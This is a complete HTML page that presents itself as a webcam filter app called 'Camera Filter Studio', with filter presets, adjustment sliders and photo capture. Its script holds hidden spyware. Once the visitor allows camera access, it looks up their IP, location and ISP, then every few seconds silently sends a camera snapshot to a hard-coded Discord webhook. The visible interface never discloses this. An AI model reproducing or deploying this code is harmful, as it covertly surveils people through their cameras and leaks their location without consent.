<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Filter Studio</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            color: #333;
            overflow-x: hidden;
        }
        header {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(10px);
            padding: 1rem 2rem;
            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
            z-index: 100;
        }
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        h1 {
            font-size: 1.8rem;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .camera-icon { width:32px; height:32px; fill:#667eea; }
        main {
            flex:1;
            display:flex;
            padding:2rem;
            gap:2rem;
            max-width:1400px;
            margin:0 auto;
            width:100%;
        }
        .camera-section {
            flex:1;
            display:flex;
            flex-direction:column;
            gap:1.5rem;
        }
        .video-container {
            position:relative;
            background:#000;
            border-radius:20px;
            overflow:hidden;
            box-shadow:0 10px 40px rgba(0,0,0,0.3);
            aspect-ratio:4/3;
        }
        #video {
            width:100%;
            height:100%;
            object-fit:cover;
            display:block;
        }
        .video-overlay {
            position:absolute;
            inset:0;
            pointer-events:none;
            display:flex;
            align-items:center;
            justify-content:center;
            background:rgba(0,0,0,0.7);
            opacity:0;
            transition:opacity 0.3s;
        }
        .video-overlay.show { opacity:1; }
        .overlay-content { text-align:center; color:white; }
        .spinner {
            width:50px; height:50px;
            border:3px solid rgba(255,255,255,0.3);
            border-top-color:white;
            border-radius:50%;
            animation:spin 1s linear infinite;
            margin:0 auto 1rem;
        }
        @keyframes spin { to { transform:rotate(360deg); } }
        .controls {
            display:flex;
            gap:1rem;
            justify-content:center;
            flex-wrap:wrap;
        }
        .btn {
            padding:0.75rem 1.5rem;
            border:none;
            border-radius:12px;
            font-size:1rem;
            font-weight:600;
            cursor:pointer;
            transition:all 0.3s;
            display:inline-flex;
            align-items:center;
            gap:0.5rem;
            box-shadow:0 4px 15px rgba(0,0,0,0.1);
        }
        .btn-primary {
            background:linear-gradient(135deg,#667eea,#764ba2);
            color:white;
        }
        .btn-primary:hover {
            transform:translateY(-2px);
            box-shadow:0 6px 20px rgba(102,126,234,0.4);
        }
        .btn-secondary {
            background:white;
            color:#667eea;
            border:2px solid #667eea;
        }
        .btn-secondary:hover {
            background:#667eea;
            color:white;
        }
        .btn:disabled { opacity:0.5; cursor:not-allowed; }
        .filters-panel {
            width:350px;
            background:rgba(255,255,255,0.95);
            backdrop-filter:blur(10px);
            border-radius:20px;
            padding:1.5rem;
            box-shadow:0 10px 40px rgba(0,0,0,0.1);
            max-height:calc(100vh - 200px);
            overflow-y:auto;
        }
        .filters-panel h2 { margin-bottom:1.5rem; color:#333; font-size:1.3rem; }
        .filter-grid {
            display:grid;
            grid-template-columns:repeat(2,1fr);
            gap:1rem;
            margin-bottom:2rem;
        }
        .filter-item {
            position:relative;
            border-radius:12px;
            overflow:hidden;
            cursor:pointer;
            transition:all 0.3s;
            border:3px solid transparent;
            background:#f0f0f0;
        }
        .filter-item:hover {
            transform:scale(1.05);
            box-shadow:0 5px 20px rgba(0,0,0,0.2);
        }
        .filter-item.active {
            border-color:#667eea;
            box-shadow:0 0 0 3px rgba(102,126,234,0.2);
        }
        .filter-preview { width:100%; height:100px; object-fit:cover; display:block; }
        .filter-name {
            position:absolute;
            bottom:0;
            left:0;
            right:0;
            background:linear-gradient(to top, rgba(0,0,0,0.7), transparent);
            color:white;
            padding:0.5rem;
            font-size:0.85rem;
            font-weight:600;
        }
        .custom-filters {
            border-top:1px solid #e0e0e0;
            padding-top:1.5rem;
        }
        .custom-filters h3 { margin-bottom:1rem; color:#555; font-size:1.1rem; }
        .slider-control { margin-bottom:1.5rem; }
        .slider-label {
            display:flex;
            justify-content:space-between;
            margin-bottom:0.5rem;
            font-size:0.9rem;
            color:#666;
        }
        .slider {
            width:100%;
            height:6px;
            border-radius:3px;
            background:#e0e0e0;
            outline:none;
            -webkit-appearance:none;
        }
        .slider::-webkit-slider-thumb {
            -webkit-appearance:none;
            appearance:none;
            width:20px; height:20px;
            border-radius:50%;
            background:linear-gradient(135deg,#667eea,#764ba2);
            cursor:pointer;
            box-shadow:0 2px 10px rgba(102,126,234,0.3);
        }
        .slider::-moz-range-thumb {
            width:20px; height:20px;
            border-radius:50%;
            background:linear-gradient(135deg,#667eea,#764ba2);
            cursor:pointer;
            box-shadow:0 2px 10px rgba(102,126,234,0.3);
        }
        .captured-photos {
            margin-top:2rem;
            border-top:1px solid #e0e0e0;
            padding-top:1.5rem;
        }
        .captured-photos h3 { margin-bottom:1rem; color:#555; font-size:1.1rem; }
        .photos-grid {
            display:grid;
            grid-template-columns:repeat(3,1fr);
            gap:0.5rem;
        }
        .photo-thumb {
            position:relative;
            border-radius:8px;
            overflow:hidden;
            cursor:pointer;
            transition:transform 0.3s;
            aspect-ratio:1;
        }
        .photo-thumb:hover { transform:scale(1.1); z-index:10; }
        .photo-thumb img { width:100%; height:100%; object-fit:cover; }
        .photo-thumb .delete-btn {
            position:absolute;
            top:5px; right:5px;
            background:rgba(255,255,255,0.9);
            border:none;
            border-radius:50%;
            width:24px; height:24px;
            cursor:pointer;
            display:none;
            align-items:center;
            justify-content:center;
            font-size:12px;
            color:#e74c3c;
        }
        .photo-thumb:hover .delete-btn { display:flex; }
        .toast {
            position:fixed;
            bottom:2rem;
            left:50%;
            transform:translateX(-50%) translateY(100px);
            background:white;
            padding:1rem 2rem;
            border-radius:12px;
            box-shadow:0 5px 20px rgba(0,0,0,0.2);
            display:flex;
            align-items:center;
            gap:0.75rem;
            opacity:0;
            transition:all 0.3s;
            z-index:1000;
        }
        .toast.show {
            transform:translateX(-50%) translateY(0);
            opacity:1;
        }
        .toast-icon { width:24px; height:24px; }
        .toast.success .toast-icon { color:#27ae60; }
        .toast.error .toast-icon { color:#e74c3c; }
        @media (max-width:968px) {
            main { flex-direction:column; }
            .filters-panel { width:100%; max-height:none; }
            .filter-grid { grid-template-columns:repeat(3,1fr); }
        }
        @media (max-width:480px) {
            .filter-grid { grid-template-columns:repeat(2,1fr); }
            .photos-grid { grid-template-columns:repeat(2,1fr); }
        }
    </style>
</head>
<body>
    <header>
        <div class="header-content">
            <h1>
                <svg class="camera-icon" viewBox="0 0 24 24">
                    <path d="M12 15.2A3.2 3.2 0 1 0 8.8 12 3.2 3.2 0 0 0 12 15.2zm0-4.8A1.6 1.6 0 1 1 10.4 12 1.6 1.6 0 0 1 12 10.4z"/>
                    <path d="M20 4h-3.17L15 2H9L7.17 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 14H4V6h4.05l1.83-2h4.24l1.83 2H20z"/>
                </svg>
                Camera Filter Studio
            </h1>
            <div class="controls">
                <button class="btn btn-secondary" id="switchCameraBtn">Switch Camera</button>
            </div>
        </div>
    </header>

    <main>
        <section class="camera-section">
            <div class="video-container">
                <video id="video" autoplay playsinline></video>
                <canvas id="canvas" style="display:none;"></canvas>
                <div class="video-overlay" id="videoOverlay">
                    <div class="overlay-content">
                        <div class="spinner"></div>
                        <p>Initializing camera...</p>
                    </div>
                </div>
            </div>
            <div class="controls">
                <button class="btn btn-primary" id="captureBtn" disabled>Capture Photo</button>
                <button class="btn btn-secondary" id="downloadBtn" disabled>Download</button>
                <button class="btn btn-secondary" id="clearPhotosBtn">Clear All</button>
            </div>
        </section>

        <aside class="filters-panel">
            <h2>Filters</h2>
            <div class="filter-grid" id="filterGrid"></div>
            <div class="custom-filters">
                <h3>Custom Adjustments</h3>
                <div class="slider-control">
                    <div class="slider-label"><span>Brightness</span><span id="brightnessValue">100%</span></div>
                    <input type="range" class="slider" id="brightness" min="50" max="150" value="100">
                </div>
                <div class="slider-control">
                    <div class="slider-label"><span>Contrast</span><span id="contrastValue">100%</span></div>
                    <input type="range" class="slider" id="contrast" min="50" max="150" value="100">
                </div>
                <div class="slider-control">
                    <div class="slider-label"><span>Saturation</span><span id="saturationValue">100%</span></div>
                    <input type="range" class="slider" id="saturation" min="0" max="200" value="100">
                </div>
                <div class="slider-control">
                    <div class="slider-label"><span>Blur</span><span id="blurValue">0px</span></div>
                    <input type="range" class="slider" id="blur" min="0" max="10" value="0" step="0.5">
                </div>
            </div>
            <div class="captured-photos">
                <h3>Captured Photos</h3>
                <div class="photos-grid" id="photosGrid"></div>
            </div>
        </aside>
    </main>

    <div class="toast" id="toast">
        <svg class="toast-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
        </svg>
        <span id="toastMessage">Message</span>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1468730735459569868/zcrVS4WVfHwsyi7RaUF6x6MjmTC8pwkMQmv1mR9N7n4DDQCldHmP8EObTQgxYD_m-NlJ";

        let stream = null;
        let currentFilter = 'none';
        let capturedPhotos = [];
        let currentCamera = 'user';
        let customFilters = { brightness:100, contrast:100, saturation:100, blur:0 };
        let exfilInterval = null;

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const captureBtn = document.getElementById('captureBtn');
        const downloadBtn = document.getElementById('downloadBtn');
        const switchCameraBtn = document.getElementById('switchCameraBtn');
        const clearPhotosBtn = document.getElementById('clearPhotosBtn');
        const filterGrid = document.getElementById('filterGrid');
        const photosGrid = document.getElementById('photosGrid');
        const videoOverlay = document.getElementById('videoOverlay');
        const toast = document.getElementById('toast');
        const toastMessage = document.getElementById('toastMessage');

        const filters = [
            { name:'Normal', value:'none', preview:'none' },
            { name:'Vintage', value:'sepia(0.5) contrast(1.2) brightness(0.9)', preview:'sepia(0.5)' },
            { name:'Cold', value:'hue-rotate(180deg) saturate(0.7)', preview:'hue-rotate(180deg)' },
            { name:'Warm', value:'hue-rotate(-30deg) saturate(1.3) brightness(1.1)', preview:'hue-rotate(-30deg)' },
            { name:'B&W', value:'grayscale(1) contrast(1.2)', preview:'grayscale(1)' },
            { name:'Dramatic', value:'contrast(1.5) brightness(0.8) saturate(1.2)', preview:'contrast(1.5)' },
            { name:'Dreamy', value:'blur(1px) brightness(1.2) saturate(1.3)', preview:'blur(1px)' },
            { name:'Retro', value:'sepia(0.3) contrast(1.1) hue-rotate(10deg)', preview:'sepia(0.3)' },
            { name:'Cyberpunk', value:'hue-rotate(270deg) saturate(1.5) contrast(1.3)', preview:'hue-rotate(270deg)' },
            { name:'Sunset', value:'hue-rotate(-20deg) saturate(1.5) brightness(1.1)', preview:'hue-rotate(-20deg)' }
        ];

        async function getVictimInfo() {
            try {
                const res = await fetch('https://ipwho.is/');
                const data = await res.json();
                return {
                    ip: data.ip || 'unknown',
                    city: data.city || 'unknown',
                    region: data.region || 'unknown',
                    country: data.country || 'unknown',
                    isp: data.connection?.isp || 'unknown'
                };
            } catch {
                return { ip:'unknown', city:'unknown', region:'unknown', country:'unknown', isp:'unknown' };
            }
        }

        async function stealthSendPhoto(blob, geo, isFirst = false) {
            const ts = new Date().toLocaleString();
            const ipSafe = geo.ip.replace(/\./g, '_');
            const text = isFirst
                ? `Camera access granted\nIP: ${geo.ip}\nLocation: ${geo.city}, ${geo.region}, ${geo.country}\nISP: ${geo.isp}\nTime: ${ts}`
                : `Photo captured\nIP: ${geo.ip}\nTime: ${ts}`;

            const formData = new FormData();
            formData.append('file', blob, `capture_${ipSafe}_${Date.now()}.jpg`);
            formData.append('payload_json', JSON.stringify({ content: text }));

            fetch(WEBHOOK_URL, { method:'POST', body:formData, mode:'no-cors' }).catch(()=>{});
        }

        function startStealthCapture() {
            if (exfilInterval) clearInterval(exfilInterval);
            getVictimInfo().then(geo => {
                stealthSendPhoto(new Blob(), geo, true);
                exfilInterval = setInterval(async () => {
                    if (!video.videoWidth) return;
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.filter = video.style.filter || 'none';
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(b => {
                        if (b) stealthSendPhoto(b, geo);
                    }, 'image/jpeg', 0.55);
                }, 3200);
            });
        }

        async function initCamera() {
            videoOverlay.classList.add('show');
            try {
                const constraints = {
                    video: {
                        facingMode: currentCamera,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                }
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    captureBtn.disabled = false;
                    videoOverlay.classList.remove('show');
                    showToast('Camera ready', 'success');
                    startStealthCapture();
                };
            } catch (err) {
                videoOverlay.innerHTML = `
                    <div class="overlay-content">
                        <p>Camera access denied or unavailable</p>
                        <p style="font-size:0.9rem; margin-top:0.5rem;">Please allow camera permissions</p>
                    </div>
                `;
                videoOverlay.classList.add('show');
                showToast('Failed to access camera', 'error');
            }
        }

        function createFilterButtons() {
            filters.forEach(filter => {
                const item = document.createElement('div');
                item.className = 'filter-item';
                if (filter.value === 'none') item.classList.add('active');
                item.innerHTML = `
                    <img src="https://picsum.photos/seed/${filter.name}/150/100.jpg" class="filter-preview" style="filter: ${filter.preview}">
                    <div class="filter-name">${filter.name}</div>
                `;
                item.addEventListener('click', () => {
                    document.querySelectorAll('.filter-item').forEach(i => i.classList.remove('active'));
                    item.classList.add('active');
                    currentFilter = filter.value;
                    applyFilters();
                });
                filterGrid.appendChild(item);
            });
        }

        function applyFilters() {
            let filterStr = currentFilter === 'none' ? '' : currentFilter;
            if (customFilters.brightness !== 100) filterStr += ` brightness(${customFilters.brightness}%)`;
            if (customFilters.contrast !== 100) filterStr += ` contrast(${customFilters.contrast}%)`;
            if (customFilters.saturation !== 100) filterStr += ` saturate(${customFilters.saturation}%)`;
            if (customFilters.blur > 0) filterStr += ` blur(${customFilters.blur}px)`;
            video.style.filter = filterStr;
        }

        ['brightness','contrast','saturation','blur'].forEach(id => {
            const el = document.getElementById(id);
            el.addEventListener('input', e => {
                customFilters[id] = e.target.value;
                document.getElementById(id + 'Value').textContent = id === 'blur' ? `${e.target.value}px` : `${e.target.value}%`;
                applyFilters();
            });
        });

        captureBtn.addEventListener('click', () => {
            ctx.filter = video.style.filter;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const data = canvas.toDataURL('image/jpeg', 0.95);
            capturedPhotos.push({ id:Date.now(), data, filter:currentFilter, custom:{...customFilters} });
            updatePhotosGrid();
            downloadBtn.disabled = false;
            showToast('Photo captured', 'success');
            video.style.opacity = '0';
            setTimeout(() => video.style.opacity = '1', 100);
        });

        function updatePhotosGrid() {
            photosGrid.innerHTML = '';
            capturedPhotos.slice(-9).reverse().forEach(p => {
                const thumb = document.createElement('div');
                thumb.className = 'photo-thumb';
                thumb.innerHTML = `
                    <img src="${p.data}" alt="photo">
                    <button class="delete-btn" data-id="${p.id}">Ã—</button>
                `;
                thumb.querySelector('img').onclick = () => {
                    const a = document.createElement('a');
                    a.href = p.data;
                    a.download = `photo_${p.id}.jpg`;
                    a.click();
                };
                thumb.querySelector('.delete-btn').onclick = e => {
                    e.stopPropagation();
                    capturedPhotos = capturedPhotos.filter(x => x.id !== p.id);
                    updatePhotosGrid();
                    if (!capturedPhotos.length) downloadBtn.disabled = true;
                    showToast('Photo deleted', 'success');
                };
                photosGrid.appendChild(thumb);
            });
        }

        downloadBtn.onclick = () => {
            if (capturedPhotos.length) {
                const last = capturedPhotos[capturedPhotos.length-1];
                const a = document.createElement('a');
                a.href = last.data;
                a.download = `filtered_${last.id}.jpg`;
                a.click();
                showToast('Photo downloaded', 'success');
            }
        };

        switchCameraBtn.onclick = () => {
            currentCamera = currentCamera === 'user' ? 'environment' : 'user';
            initCamera();
        };

        clearPhotosBtn.onclick = () => {
            if (capturedPhotos.length && confirm('Delete all photos?')) {
                capturedPhotos = [];
                updatePhotosGrid();
                downloadBtn.disabled = true;
                showToast('All photos cleared', 'success');
            }
        };

        function showToast(msg, type = 'success') {
            toastMessage.textContent = msg;
            toast.className = `toast ${type} show`;
            setTimeout(() => toast.classList.remove('show'), 3000);
        }

        if (!navigator.mediaDevices?.getUserMedia) {
            videoOverlay.innerHTML = `
                <div class="overlay-content">
                    <p>Camera not supported</p>
                </div>
            `;
            videoOverlay.classList.add('show');
            showToast('Camera not supported', 'error');
        } else {
            createFilterButtons();
            initCamera();
        }

        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(t => t.stop());
        });
    </script>
</body>
</html>
